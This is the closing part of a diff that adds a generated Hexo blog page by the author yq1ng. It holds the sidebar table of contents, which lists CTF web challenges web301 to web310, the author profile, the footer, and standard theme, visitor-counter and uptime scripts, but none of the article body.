+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web301"><span class="nav-number">1.</span> <span class="nav-text">web301</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web302"><span class="nav-number">2.</span> <span class="nav-text">web302</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web303-amp-304"><span class="nav-number">3.</span> <span class="nav-text">web303 &amp; 304</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web305"><span class="nav-number">4.</span> <span class="nav-text">web305</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web306"><span class="nav-number">5.</span> <span class="nav-text">web306</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web307"><span class="nav-number">6.</span> <span class="nav-text">web307</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web308"><span class="nav-number">7.</span> <span class="nav-text">web308</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web309"><span class="nav-number">8.</span> <span class="nav-text">web309</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web310"><span class="nav-number">9.</span> <span class="nav-text">web310</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yq1ng"
+      src="/images/xiaoxin.jpg">
+  <p class="site-author-name" itemprop="name">yq1ng</p>
+  <div class="site-description" itemprop="description">The best way to know your strength is to fight</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">51</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yq1ng" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yq1ng" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/weixin_43578492" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_43578492" rel="noopener" target="_blank"><i class="heartbeat fa-fw"></i>CSDN</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1578422748@qq.com" title="E-Mail → mailto:1578422748@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=%271578422748++%27&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;&#39;1578422748++&#39;&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <script
+  async
+  src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"
+></script>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yq1ng</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">294k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">8:10</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+<br />
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("09/27/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/src/clicklove.js"></script>
+</body>
+</html>
